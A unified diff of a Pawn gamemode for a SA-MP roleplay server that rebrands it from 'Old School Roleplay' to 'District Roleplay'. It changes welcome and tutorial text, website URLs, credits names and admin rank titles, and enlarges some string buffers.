@@ -20,12 +20,12 @@
 #define MYSQL_USERNAME  "root"
 #define MYSQL_PASSWORD  ""
 // ---------------------------------------
-#define SERVER_NAME      	"Real Life Roleplay"
-#define SERVER_REVISION  	"RL:RP v1.0 R2"
+#define SERVER_NAME      	"District Roleplay"
+#define SERVER_REVISION  	"D:RP v1.0 R2"
 #define SERVER_ANTICHEAT 	"The server"
-#define SERVER_MUSIC_URL 	"os-rp.net/music"
-#define SERVER_FETCH_URL 	"os-rp.net/music"
-#define VIP_MUSIC_URL 		"os-rp.net/music"
+#define SERVER_MUSIC_URL 	"district-rp.net/music"
+#define SERVER_FETCH_URL 	"district-rp.net/music"
+#define VIP_MUSIC_URL 		"district-rp.net/music"
 // ---------------------------------------
 #include "server/def/def_table.osrp"
 #include "server/def/def_colors.osrp"
@@ -7184,14 +7184,14 @@ GetAdmCmdRank(playerid)
 		case 6: string = "{FF0000}Head Admin{FF6347}";
 		case 7: string = "{298EFF}Lead Head Admin{FF6347}";
 		case 8: string = "{298EFF}Executive Admin{FF6347}";
-		case 9: string = "{D909D9}Asst Management{FF6347}";
-		case 10: string = "{D909D9}Management{FF6347}";
+		case 9: string = "{D909D9}Community Director{FF6347}";
+		case 10: string = "{D909D9}Community Founder{FF6347}";
 	}
 	return string;
 }
 GetAdminRank1(playerid)
 {
-	new string[24];
+	new string[128];
 
 	switch(PlayerData[playerid][pAdmin])
 	{
@@ -7212,8 +7212,8 @@ GetAdminRank1(playerid)
 		case 6: string = "{FF0000}Head Admin";
 		case 7: string = "{298EFF}Lead Head Admin";
 		case 8: string = "{298EFF}Executive Admin";
-		case 9: string = "{D909D9}Asst Management";
-		case 10: string = "{D909D9}Management";
+		case 9: string = "{D909D9}Community Director";
+		case 10: string = "{D909D9}Community Founder";
 	}
 	return string;
 }
@@ -7221,7 +7221,7 @@ GetAdminRank1(playerid)
 
 GetHelperRank(playerid)
 {
-	new string[24];
+	new string[128];
 
 	switch(PlayerData[playerid][pHelper])
 	{
@@ -11489,7 +11489,7 @@ stock LoadGeneralTextdraws()
 	//------------------------------------------//
 
  	/////////////////////////////////////////////
-	welcomenew = TextDrawCreate(327.496246, 153.999984, "Welcome to ~g~Old School Roleplay~w~!");
+	welcomenew = TextDrawCreate(327.496246, 153.999984, "Welcome to ~g~District Roleplay~w~!");
 	TextDrawLetterSize(welcomenew, 0.449999, 1.600000);
 	TextDrawAlignment(welcomenew, 2);
 	TextDrawColor(welcomenew, -1);
@@ -11578,7 +11578,7 @@ stock LoadGeneralTextdraws()
 	TextDrawBackgroundColor(Tutorial[0], 255);
 	TextDrawFont(Tutorial[0], 0);
 
-	Tutorial[1] = TextDrawCreate(232.666809, 265.896209, "Old School Roleplay - Tutorial");
+	Tutorial[1] = TextDrawCreate(232.666809, 265.896209, "District Roleplay - Tutorial");
 	TextDrawLetterSize(Tutorial[1], 0.335000, 1.616592);
 	TextDrawAlignment(Tutorial[1], 1);
 	TextDrawColor(Tutorial[1], 144559871);
@@ -11588,7 +11588,7 @@ stock LoadGeneralTextdraws()
 	TextDrawFont(Tutorial[1], 1);
 	TextDrawSetProportional(Tutorial[1], 1);
 
-	Tutorial[2] = TextDrawCreate(318.666717, 290.370208, "Welcome to Old School Roleplay! Thanks for choosing us as your Roleplay destination. We hope you enjoy our community.");
+	Tutorial[2] = TextDrawCreate(318.666717, 290.370208, "Welcome to District Roleplay! Thanks for choosing us as your Roleplay destination. We hope you enjoy our community.");
 	TextDrawLetterSize(Tutorial[2], 0.195333, 1.052444);
 	TextDrawAlignment(Tutorial[2], 2);
 	TextDrawColor(Tutorial[2], -1);
@@ -11662,7 +11662,7 @@ stock LoadGeneralTextdraws()
 		TextDrawBoxColor(introTextdraws[1], 255);
 		TextDrawTextSize(introTextdraws[1], -50.000000, 0.000000);
 
-		introTextdraws[2] = TextDrawCreate(249.000000, 144.000000, "Old School Roleplay");
+		introTextdraws[2] = TextDrawCreate(249.000000, 144.000000, "District Roleplay");
 		TextDrawBackgroundColor(introTextdraws[2], 255);
 		TextDrawFont(introTextdraws[2], 2);
 		TextDrawLetterSize(introTextdraws[2], 0.400000, 2.099999);
@@ -11702,7 +11702,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[6], 1);
 		TextDrawSetProportional(introTextdraws[6], 1);
 
-		introTextdraws[7] = TextDrawCreate(555.000000, 201.000000, "Pedro~n~Leone");
+		introTextdraws[7] = TextDrawCreate(555.000000, 201.000000, "Nge~n~Venice");
 		TextDrawAlignment(introTextdraws[7], 2);
 		TextDrawBackgroundColor(introTextdraws[7], 255);
 		TextDrawFont(introTextdraws[7], 2);
@@ -11719,7 +11719,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[8], 1);
 		TextDrawSetProportional(introTextdraws[8], 1);
 
-		introTextdraws[9] = TextDrawCreate(44.000000, 178.000000, "Leone");
+		introTextdraws[9] = TextDrawCreate(44.000000, 178.000000, "Nge");
 		TextDrawBackgroundColor(introTextdraws[9], 255);
 		TextDrawFont(introTextdraws[9], 2);
 		TextDrawLetterSize(introTextdraws[9], 0.189999, 1.399997);
@@ -11735,7 +11735,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[10], 1);
 		TextDrawSetProportional(introTextdraws[10], 1);
 
-		introTextdraws[11] = TextDrawCreate(65.000000, 246.000000, "Jack~n~Helena");
+		introTextdraws[11] = TextDrawCreate(65.000000, 246.000000, "Feng~n~Tokyo");
 		TextDrawAlignment(introTextdraws[11], 2);
 		TextDrawBackgroundColor(introTextdraws[11], 255);
 		TextDrawFont(introTextdraws[11], 2);
@@ -11752,7 +11752,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[12], 1);
 		TextDrawSetProportional(introTextdraws[12], 1);
 
-		introTextdraws[13] = TextDrawCreate(192.000000, 168.000000, "Michael~n~Leone~n~Helena");
+		introTextdraws[13] = TextDrawCreate(192.000000, 168.000000, "Newbie~n~Primo~n~Cosmac");
 		TextDrawAlignment(introTextdraws[13], 2);
 		TextDrawBackgroundColor(introTextdraws[13], 255);
 		TextDrawFont(introTextdraws[13], 2);
@@ -11769,7 +11769,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[14], 1);
 		TextDrawSetProportional(introTextdraws[14], 1);
 
-		introTextdraws[15] = TextDrawCreate(469.000000, 233.000000, "Hank~n~Mike");
+		introTextdraws[15] = TextDrawCreate(469.000000, 233.000000, "Tokyo~n~Sherlock");
 		TextDrawAlignment(introTextdraws[15], 2);
 		TextDrawBackgroundColor(introTextdraws[15], 255);
 		TextDrawFont(introTextdraws[15], 2);
@@ -11786,7 +11786,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[16], 1);
 		TextDrawSetProportional(introTextdraws[16], 1);
 
-		introTextdraws[17] = TextDrawCreate(321.000000, 165.000000, "Incognito~n~BlueG~n~Y_Less~n~Pedro~n~Leone~n~Admin team~n~Helper team~n~Beta testers~n~Our players!");
+		introTextdraws[17] = TextDrawCreate(321.000000, 165.000000, "Nge~n~Tokyo~n~Vaas~n~Feng~n~Primo~n~Maxwell~n~Administration~n~Helpers~n~Beta Testers~n~Supporters!");
 		TextDrawAlignment(introTextdraws[17], 2);
 		TextDrawBackgroundColor(introTextdraws[17], 255);
 		TextDrawFont(introTextdraws[17], 2);
@@ -11843,7 +11843,7 @@ stock LoadGeneralTextdraws()
 		TextDrawSetOutline(introTextdraws[23], 1);
 		TextDrawSetProportional(introTextdraws[23], 1);
 
-		introTextdraws[24] = TextDrawCreate(258.000000, 146.000000, "Old School Roleplay");
+		introTextdraws[24] = TextDrawCreate(258.000000, 146.000000, "District Roleplay");
 		TextDrawBackgroundColor(introTextdraws[24], 255);
 		TextDrawFont(introTextdraws[24], 0);
 		TextDrawLetterSize(introTextdraws[24], 0.649998, 2.699997);
@@ -14859,12 +14859,12 @@ ShowDialogToPlayer(playerid, dialogid)
 		}
 		case DIALOG_REGISTER:
 		{
-        	Dialog_Show(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "Account Registration", "Welcome to Old School Roleplay\n\nEnter your password of choice below to register:", "Register", "");
+        	Dialog_Show(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "Account Registration", "Welcome to District Roleplay\n\nEnter your password of choice below to register:", "Register", "");
 
 		}
 		case DIALOG_LOGIN:
 		{
-     		Dialog_Show(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "{FFFF00}Login Authentication", "{afafaf}Welcome to {00aa00}Old School Roleplay.\n\n{afafaf}Enter your account password below to login:", "Login", "");
+     		Dialog_Show(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "{FFFF00}Login Authentication", "{afafaf}Welcome to {00aa00}District Roleplay.\n\n{afafaf}Enter your account password below to login:", "Login", "");
 			SendClientMessage(playerid, COLOR_OLDSCHOOL, "[SERVER]{ffffff} You have 60 seconds to login otherwise you will be kicked from the server.");
             showmotd(playerid);
 		}
@@ -21645,7 +21645,7 @@ ReferralCheck(playerid)
 
 PlayLoginMusic(playerid)
 {
-	PlayAudioStreamForPlayer(playerid, "https://os-rp.net/music/osrp.mp3");
+	PlayAudioStreamForPlayer(playerid, "https://district-rp.net/music/osrp.mp3");
 }
 
 AwardAchievement(playerid, const name[])
@@ -21689,7 +21689,7 @@ SendNewbieChatMessage(playerid, text[])
 	} else if(PlayerData[playerid][pLevel] > 1) {
 	    format(string, sizeof(string), "Player %s", GetRPName(playerid));
 	} else if(PlayerData[playerid][pHours] > 250) {
-	    format(string, sizeof(string), "OS:RP Veteran: %s", GetRPName(playerid));
+	    format(string, sizeof(string), "District Veteran: %s", GetRPName(playerid));
 	} else {
 	    format(string, sizeof(string), "Newbie %s", GetRPName(playerid));
 	}
@@ -26013,10 +26013,10 @@ public TutorialTimer(playerid, stage)
                 InterpolateCameraPos(playerid, -37.715755, -2101.054931, 121.661994, 3031.810302, -638.207458, 196.425064, 12000);
 				InterpolateCameraLookAt(playerid, -33.558185, -2098.420898, 120.781112, 3028.381103, -641.794555, 195.814514, 12000);
 
-				format(string, sizeof(string), "Welcome to Old School Roleplay! Thanks for choosing us as your Roleplay Destination, we hope you enjoy your stay!");
+				format(string, sizeof(string), "Welcome to District Roleplay! Thanks for choosing us as your Roleplay Destination, we hope you enjoy your stay!");
 				strcat(string, "~n~Here at Ultimate, we pride ourselves in being a Medium Roleplay Community. Roleplay that is actually fun!");
 				strcat(string, "~n~What fun is a community where the rules are so strict, you've got to roleplay breathing? We ain't got time for that.");
-                strcat(string, "~n~Anyway, please enjoy this short introduction to get to know Old School Roleplay on a personal level.");
+                strcat(string, "~n~Anyway, please enjoy this short introduction to get to know District Roleplay on a personal level.");
  				TextDrawSetString(Tutorial[2], string);
 
 				PlayerData[playerid][pTutorialTimer] = SetTimerEx("TutorialTimer", 16000, false, "ii", playerid, 2);
@@ -26051,7 +26051,7 @@ public TutorialTimer(playerid, stage)
 				SetPlayerPos(playerid, 1310.9757,-1445.2444,-27.2783);
 
 
-				format(string, sizeof(string), "This is the market area, the most common hangout on Old School Roleplay");
+				format(string, sizeof(string), "This is the market area, the most common hangout on District Roleplay");
 				strcat(string, "~n~You'll be starting out as a level 1 newbie with no upgrades. You'll need to level up with respect points.");
 				strcat(string, "~n~For every hour you play, you'll gain 1 respect point. You earn this on your paycheck.");
                 strcat(string, "~n~Paychecks will be given out once every hour when the time hits xx:00.");
@@ -26071,12 +26071,12 @@ public TutorialTimer(playerid, stage)
 
 				SetPlayerPos(playerid, 1493.3798,-1668.6997,-15.7351);
 
-				format(string, sizeof(string), "Old School Roleplay has many great factions to offer.");
+				format(string, sizeof(string), "District Roleplay has many great factions to offer.");
 				strcat(string, "~n~You're currently looking at the Los Santos Police Department.");
 				strcat(string, "~n~Factions are legal organizations, each with their own unique roles.");
                 strcat(string, "~n~Factions are dedicated to helping the citizens of Los Santos,");
                 strcat(string, "~n~Whether it be enforcing the law, saving lives, or reporting the news.");
-                strcat(string, "~n~You can apply to become a faction member on our forum at os-rp.net");
+                strcat(string, "~n~You can apply to become a faction member on our forum at district-rp.com");
                 strcat(string, "~n~Being in a faction is quite fun and can lead to some good cash and perks for you!");
  				TextDrawSetString(Tutorial[2], string);
 
@@ -26092,12 +26092,12 @@ public TutorialTimer(playerid, stage)
 				SetPlayerPos(playerid, 2467.3708,-1666.0961,7.8903);
 
 				format(string, sizeof(string), "Doing things the legal way isnt your type? We've got you covered.");
-				strcat(string, "~n~Here on Old School Roleplay we have an amazing gang system with many unique features!");
+				strcat(string, "~n~Here on District Roleplay we have an amazing gang system with many unique features!");
 				strcat(string, "~n~Gangs are illegal organizations you may join by roleplaying with the higher ranks.");
                 strcat(string, "~n~Gangs offer many different types of roleplay, from street gangs to mafias & cartels.");
                 strcat(string, "~n~Gangs main objectives are to own the city of Los Santos by capturing points & turfs");
                 strcat(string, "~n~Grab yourself a gun and roleplay your way into a gang!");
-                strcat(string, "~n~You can also apply for your own gang slot at os-rp.net!!");
+                strcat(string, "~n~You can also apply for your own gang slot at district-rp.com!");
  				TextDrawSetString(Tutorial[2], string);
 
 				PlayerData[playerid][pTutorialTimer] = SetTimerEx("TutorialTimer", 15000, false, "ii", playerid, 7);
@@ -26112,7 +26112,7 @@ public TutorialTimer(playerid, stage)
 				SetPlayerPos(playerid, 2093.6177,-1302.5441,4.6590);
 
 				format(string, sizeof(string), "Want your own piece of real estate? We've got you covered!");
-				strcat(string, "~n~Here on Old School Roleplay we offer a wide variety of property types you may own.");
+				strcat(string, "~n~Here on District Roleplay we offer a wide variety of property types you may own.");
 				strcat(string, "~n~Buying your own house will allow you to customize the interior and store your goodies!");
                 strcat(string, "~n~Buying a garage will allow you to keep your car from being stolen, repair it, and upgrade it! ");
                 strcat(string, "~n~Buying your own business is an excellent source of income! There are many different types!");
@@ -26141,7 +26141,7 @@ public TutorialTimer(playerid, stage)
                 strcat(string, "~n~3.) No powergaming. Powergaming is commiting unrealistic acts and forcing actions upon others.");
                 strcat(string, "~n~4.) No hacking/cheating. We have zero tolerance for people who use cheats. Permanent ban.");
                 strcat(string, "~n~5.) No exploiting. If you find a bug that gives you an unfair advantage, report it on the forums.");
-                strcat(string, "~n~Please visit our website - os-rp.net for a complete list of our rules.!");
+                strcat(string, "~n~Please visit our website - district-rp.com for a complete list of our rules.!");
  				TextDrawSetString(Tutorial[2], string);
 
 				PlayerData[playerid][pTutorialTimer] = SetTimerEx("TutorialTimer", 18000, false, "ii", playerid, 10);
@@ -26177,12 +26177,12 @@ public TutorialTimer(playerid, stage)
 			    TogglePlayerControllable(playerid, 1);
 				mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE "#TABLE_USERS" SET setup = 0, gender = %i, age = %i, skin = %i WHERE uid = %i", PlayerData[playerid][pGender], PlayerData[playerid][pAge], PlayerData[playerid][pSkin], PlayerData[playerid][pID]);
 				mysql_tquery(connectionID, queryBuffer);
-				SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}Old School Roleplay{FFFFFF}. Make sure to visit os-rp.net for news and updates.");
+				SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}District Roleplay{FFFFFF}. Make sure to visit district-rp.com for news and updates.");
 				SendClientMessage(playerid, COLOR_WHITE, "Use the {FFFF90}/locate{FFFFFF} command to point to locations of jobs, businesses, and common places.");
 				StopAudioStreamForPlayer(playerid);
 		        DestroyDynamic3DTextLabel(fRepfamtext[playerid]);
 		        fRepfamtext[playerid] = Text3D:INVALID_3DTEXT_ID;
-				SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on Old School Roleplay for the first time!", GetRPName(playerid), playerid);
+				SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on District Roleplay for the first time!", GetRPName(playerid), playerid);
    				SendClientMessage(playerid, COLOR_AQUA, "You need a driver's license, the DMV has been marked on your map. Navigate to the marker to begin your drivers test.");
    				PlayerData[playerid][pCP] = CHECKPOINT_MISC;
                 SetPlayerCheckpoint(playerid, 1219.2590, -1812.1093, 16.5938, 3.0);
@@ -27661,7 +27661,7 @@ public MinuteTimer()
 	}
 	if(gHour != hour)
 	{
-	    SendClientMessageToAllEx(COLOR_WHITE, "Old School Roleplay: The time is now {AFAFAF}%02d:00{FFFFFF}.", hour);
+	    SendClientMessageToAllEx(COLOR_WHITE, "District Roleplay: The time is now {AFAFAF}%02d:00{FFFFFF}.", hour);
         autoWeather();
 		new budget;
 		for(new i = 0; i < MAX_FACTIONS; i ++)
@@ -28007,7 +28007,7 @@ public MinuteTimer()
 
 		        if(ReportInfo[i][rTime] <= 0 && ReportInfo[i][rAccepted] == 0)
 		        {
-		            SendClientMessage(ReportInfo[i][rReporter], COLOR_GREY, "Your report has expired. You can make an admin request on os-rp.net if you still need help.");
+		            SendClientMessage(ReportInfo[i][rReporter], COLOR_GREY, "Your report has expired. You can make an admin request on district-rp.com if you still need help.");
 		            ReportInfo[i][rExists] = 0;
 		        }
 			}
@@ -30611,7 +30611,7 @@ public OnQueryFinished(threadid, extraid)
 				if(cache_get_field_content_int(0, "permanent"))
 				    SendClientMessageEx(extraid, COLOR_YELLOW, "You are permanently banned from this server.");
 				else
-					SendClientMessageEx(extraid, COLOR_YELLOW, "You are banned from this server. You can appeal your ban at os-rp.net.");
+					SendClientMessageEx(extraid, COLOR_YELLOW, "You are banned from this server. You can appeal your ban at district-rp.com.");
 
 				SendClientMessageEx(extraid, COLOR_LIGHTRED, "Admin: %s", bannedby);
 	            SendClientMessageEx(extraid, COLOR_LIGHTRED, "Date: %s", date);
@@ -30671,14 +30671,14 @@ public OnQueryFinished(threadid, extraid)
 				}
 				else
 				{
-				    Dialog_Show(extraid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}OS:RP{FFFFFF} | Unable to Login", "{FFFFFF}It seems like you've forgotten your password.\n\nYou can reset you can reset your password using your pin code at the User Control Panel.", "Cancel", "");
+				    Dialog_Show(extraid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}D:RP{FFFFFF} | Unable to Login", "{FFFFFF}It seems like you've forgotten your password.\n\nYou can reset you can reset your password using your pin code at the User Control Panel.", "Cancel", "");
 				    KickPlayer(extraid);
 				}
 		    }
 	        else if(cache_get_field_content_int(0, "locked"))
          	{
           		SendClientMessage(extraid, COLOR_LIGHTRED, "* This account is currently locked. Post an administrative request to have it lifted.");
-          		Dialog_Show(extraid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}OS:RP{FFFFFF} | Unable to Login", "{FFFFFF}This account is currently locked.\n\nYou can post an administrative request on {00aa00}os-rp.net{FFFFFF} to have it lifted.", "Cancel", "");
+          		Dialog_Show(extraid, DIALOG_NONE, DIALOG_STYLE_MSGBOX, "{00aa00}D:RP{FFFFFF} | Unable to Login", "{FFFFFF}This account is currently locked.\n\nYou can post an administrative request on {00aa00}district-rp.com{FFFFFF} to have it lifted.", "Cancel", "");
             	SendAdminMessage(COLOR_YELLOW, "AdmWarning: %s tried to login with a locked account.", GetRPName(extraid));
              	KickPlayer(extraid);
             }
@@ -31061,15 +31061,15 @@ public OnQueryFinished(threadid, extraid)
 						}
 
         	        	if(PlayerData[extraid][pAdmin] > 0) {
-							SendClientMessageEx(extraid, COLOR_WHITE, "Old School Roleplay: You have logged in as a {FF6347}level %i %s{FFFFFF}.", PlayerData[extraid][pAdmin], GetAdminRank(extraid));
+							SendClientMessageEx(extraid, COLOR_WHITE, "District Roleplay: You have logged in as a {FF6347}level %i %s{FFFFFF}.", PlayerData[extraid][pAdmin], GetAdminRank(extraid));
 						} else if(PlayerData[extraid][pHelper] > 0) {
-						    SendClientMessageEx(extraid, COLOR_WHITE, "Old School Roleplay: You have logged in as a {33CCFF}%s{FFFFFF}.", GetHelperRank(extraid));
+						    SendClientMessageEx(extraid, COLOR_WHITE, "District Roleplay: You have logged in as a {33CCFF}%s{FFFFFF}.", GetHelperRank(extraid));
 						} else if(PlayerData[extraid][pDonator] > 0) {
-						    SendClientMessageEx(extraid, COLOR_WHITE, "Old School Roleplay: You have logged in as a {D909D9}%s VIP{FFFFFF}.", GetVIPRank(PlayerData[extraid][pDonator]));
+						    SendClientMessageEx(extraid, COLOR_WHITE, "District Roleplay: You have logged in as a {D909D9}%s VIP{FFFFFF}.", GetVIPRank(PlayerData[extraid][pDonator]));
         	        	} else if(PlayerData[extraid][pLevel] >= 2) {
-        	        	    SendClientMessageEx(extraid, COLOR_WHITE, "Old School Roleplay: You have logged in as a {AFAFAF}level %i player{FFFFFF}.", PlayerData[extraid][pLevel]);
+        	        	    SendClientMessageEx(extraid, COLOR_WHITE, "District Roleplay: You have logged in as a {AFAFAF}level %i player{FFFFFF}.", PlayerData[extraid][pLevel]);
 						} else {
-						    SendClientMessage(extraid, COLOR_WHITE, "Old School Roleplay: You have logged in as a {AFAFAF}level 1 newbie{FFFFFF}.");
+						    SendClientMessage(extraid, COLOR_WHITE, "District Roleplay: You have logged in as a {AFAFAF}level 1 newbie{FFFFFF}.");
 						}
 
 					    SendClientMessageEx(extraid, COLOR_NAVYBLUE, "Your last login was on the %s (server time).", GetDate());
@@ -31094,7 +31094,7 @@ public OnQueryFinished(threadid, extraid)
 					}
 					if(PlayerData[extraid][pPasswordChanged] == 0)
 					{
-					    Dialog_Show(extraid, DIALOG_CHANGEPASS, DIALOG_STYLE_INPUT, "{00aa00}Old School Roleplay{FFFFFF} | Change password", "Please change your password for security purposes\nEnter your new password below:", "Submit", "Cancel");
+					    Dialog_Show(extraid, DIALOG_CHANGEPASS, DIALOG_STYLE_INPUT, "{00aa00}District Roleplay{FFFFFF} | Change password", "Please change your password for security purposes\nEnter your new password below:", "Submit", "Cancel");
 					}
 
 				}
@@ -32302,10 +32302,10 @@ public OnQueryFinished(threadid, extraid)
 					mysql_format(connectionID, queryBuffer, sizeof(queryBuffer), "UPDATE "#TABLE_USERS" SET setup = 0, gender = %i, age = %i, skin = %i WHERE uid = %i", PlayerData[extraid][pGender], PlayerData[extraid][pAge], PlayerData[extraid][pSkin], PlayerData[extraid][pID]);
 					mysql_tquery(connectionID, queryBuffer);
 
-					SendClientMessage(extraid, COLOR_WHITE, "Welcome to {00aa00}Old School Roleplay{FFFFFF}. Make sure to visit os-rp.net for news and updates.");
+					SendClientMessage(extraid, COLOR_WHITE, "Welcome to {00aa00}District Roleplay{FFFFFF}. Make sure to visit district-rp.com for news and updates.");
 					SendClientMessage(extraid, COLOR_WHITE, "Use the {FFFF90}/locate{FFFFFF} command to point to locations of jobs, businesses, and common places.");
 
-					SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on Old School Roleplay for the first time!", GetRPName(extraid), extraid);
+					SendStaffMessage(COLOR_YELLOW, "OnPlayerSpawn: %s[%d] has just spawned on District Roleplay for the first time!", GetRPName(extraid), extraid);
 					StopAudioStreamForPlayer(extraid);
 	                PlayerData[extraid][pReferralUID] = cache_get_field_content_int(0, "uid");
                     DestroyDynamic3DTextLabel(fRepfamtext[extraid]);
@@ -32736,8 +32736,8 @@ public OnGameModeInit()
 
  // Default values, don't touch them - Pedro //
     SetGameModeText("Loading...");
-	SendRconCommand("weburl www.os-rp.net");
-	print("Old School Roleplay is loading...");
+	SendRconCommand("weburl www.district-rp.com");
+	print("District Roleplay is loading...");
     connectionID = mysql_connect(MYSQL_HOSTNAME, MYSQL_USERNAME, MYSQL_DATABASE, MYSQL_PASSWORD);
 
 	if(mysql_errno(connectionID))
@@ -32861,7 +32861,7 @@ public OnGameModeInit()
 		print("OOOOOOOOOOOOOOOOOOOOOOOOOO????SSSSSSSSSSSSSSSSSSSSSS");
 		print("OOOOOOOOOOOOOOOOOOOOOOOOOO????SSSSSSSSSSSSSSSSSSSSSS");
 		print("______________________________________________");
-		print("| Old School Roleplay by REFUZiON	        |");
+		print("| District Roleplay by Nge & Jordan	        |");
 		print("| Gamemode loaded successfully.              |");
 		print("______________________________________________");
 		for(new o; o < CountDynamicObjects(); o++)
@@ -33119,7 +33119,7 @@ public OnPlayerConnect(playerid)
 	GetPlayerName(playerid, PlayerData[playerid][pUsername], MAX_PLAYER_NAME);
     DestroyDynamic3DTextLabel(fRepfamtext[playerid]);
     fRepfamtext[playerid] = Text3D:INVALID_3DTEXT_ID;
-	SendClientMessage(playerid, 0xA9C4E4FF, "Establishing connection to the {00aa00}Old School Roleplay{A9C4E4} please wait...");
+	SendClientMessage(playerid, 0xA9C4E4FF, "Establishing connection to the {00aa00}District Roleplay{A9C4E4} please wait...");
 
 
 	/////////////aerodrom nikola tesla
@@ -34712,9 +34712,9 @@ public OnPlayerSpawn(playerid)
 	//	AnimationCameraView(playerid, 1,false);
 		InsideTut[playerid] = 1;
 		new tstr[1024];
-		strcat(tstr, "Welcome to Old School Roleplay!\n Thanks for choosing us as your Roleplay Destination, we hope you enjoy your stay!\n");
+		strcat(tstr, "Welcome to District Roleplay!\n Thanks for choosing us as your Roleplay Destination, we hope you enjoy your stay!\n");
 		strcat(tstr, "This tutorial will guide you through the basic steps of the server.\n");
-		strcat(tstr, "Please enjoy this short introduction to get to know Old School Roleplay on a personal level.\n");
+		strcat(tstr, "Please enjoy this short introduction to get to know District Roleplay on a personal level.\n");
 		strcat(tstr, "{FF8000}Press next to continue.");
 		TutStep[playerid] = 1;
         InterpolateCameraPos(playerid, -37.715755, -2101.054931, 121.661994, 3031.810302, -638.207458, 196.425064, 12000);
@@ -34722,7 +34722,7 @@ public OnPlayerSpawn(playerid)
 		Dialog_Show(playerid,DIALOG_SHOW_TUTORIAL,DIALOG_STYLE_MSGBOX,"{33CCFF}Tutorial", tstr, "Next", "");
 		SetPlayerVirtualWorld(playerid, 0);
 		TogglePlayerControllable(playerid, 0);
-//		SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}Old School Roleplay{FFFFFF}. You have successfully registered your account on our server.");
+//		SendClientMessage(playerid, COLOR_WHITE, "Welcome to {00aa00}District Roleplay{FFFFFF}. You have successfully registered your account on our server.");
 //		SendClientMessage(playerid, COLOR_WHITE, "Before you can play, you are required to fill in some information then watch a brief tutorial.");
 	}
 	else if(PlayerData[playerid][pJailTime] > 0)
@@ -37912,7 +37912,7 @@ public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags)
 	{
 	    //SendClientMessage(playerid, COLOR_LIGHTRED, "That command doesn't exist! Use /help for a list of commands.");
 	    //SendClientMessage(playerid, 0x089DCEFF, "[U:RP] {AAAAAA}Sorry, that command doesn't exist! Use /help for a list of commands.");
-	    SendClientMessageEx(playerid, 0x89DCEFFF, "[OS:RP]{C8C8C8} Sorry, but '/%s' does not appear to be working. Use {89DCEF}/help{C8C8C8} for a list of valid commands.", cmd);
+	    SendClientMessageEx(playerid, 0x89DCEFFF, "[D:RP]{C8C8C8} Sorry, but '/%s' does not appear to be working. Use {89DCEF}/help{C8C8C8} for a list of valid commands.", cmd);
 	}
 /*	if(result == -1)
 	{
@@ -39933,7 +39933,7 @@ Dialog:DIALOG_SHOW_TUTORIAL(playerid, response, listitem, inputtext[])
 				InterpolateCameraPos(playerid, 1244.807250, -1896.417480, 62.970653, 1320.417602, -1480.743286, 78.601524, 5000);
 				InterpolateCameraLookAt(playerid, 1243.523193, -1892.262817, 60.502914, 1318.168212, -1476.724731, 76.654434, 5000);
 				SetPlayerPos(playerid, 1310.9757,-1445.2444,-27.2783);
-				strcat(str, "{FFFFFF}This is the market area, the most common hangout on Old School Roleplay\n");
+				strcat(str, "{FFFFFF}This is the market area, the most common hangout on District Roleplay\n");
 				strcat(str, "You'll be starting out as a level 1 newbie with no upgrades. You'll need to level up with respect points.\n");
 				strcat(str, "For every hour you play, you'll gain 1 respect point. You earn this on your paycheck.\n");
 				strcat(str, "Paychecks will be given out once every hour when the time hits xx:00.\n");
@@ -39953,11 +39953,11 @@ Dialog:DIALOG_SHOW_TUTORIAL(playerid, response, listitem, inputtext[])
 				InterpolateCameraPos(playerid, 1320.417602, -1480.743408, 78.601516, 1482.683227, -1628.944824, 44.981044, 5000);
 				InterpolateCameraLookAt(playerid, 1317.750488, -1476.783447, 77.116455, 1486.893188, -1631.457153, 43.999187, 5000);
 				SetPlayerPos(playerid, 1493.3798,-1668.6997,-15.7351);
-				strcat(str, "{FFFFFF}Old School Roleplay has many great factions to offer.\n");
+				strcat(str, "{FFFFFF}District Roleplay has many great factions to offer.\n");
 				strcat(str, "You're currently looking at the Los Santos Police Department.\n");
 				strcat(str, "Factions are legal organizations, each with their own unique roles.\n");
                 strcat(str, "Whether it be enforcing the law, saving lives, or reporting the news.\n");
-                strcat(str, "You can apply to become a faction member on our forum at os-rp.net\n");
+                strcat(str, "You can apply to become a faction member on our forum at district-rp.com\n");
                 strcat(str, "Being in a faction is quite fun and can lead to some good cash and perks for you!\n");
 				strcat(str, "{FF8000}Press next to continue.");
 				Dialog_Show(playerid, DIALOG_SHOW_TUTORIAL, DIALOG_STYLE_MSGBOX, "{33CCFF}Tutorial - Factions", str, "Next", "");
@@ -39976,7 +39976,7 @@ Dialog:DIALOG_SHOW_TUTORIAL(playerid, response, listitem, inputtext[])
 
 
 				strcat(str, "{FFFFFF}Doing things the legal way isnt your type? We've got you covered\n");
-				strcat(str, "Here on Old School Roleplay we have an amazing gang system with many unique features!\n");
+				strcat(str, "Here on District Roleplay we have an amazing gang system with many unique features!\n");
 				strcat(str, "Gangs are illegal organizations you may join by roleplaying with the higher ranks.\n");
 				strcat(str, "Gangs offer many different types of roleplay, from street gangs to mafias & cartels.\n");
 				strcat(str, "Grab yourself a gun and roleplay your way into a gang!\n");
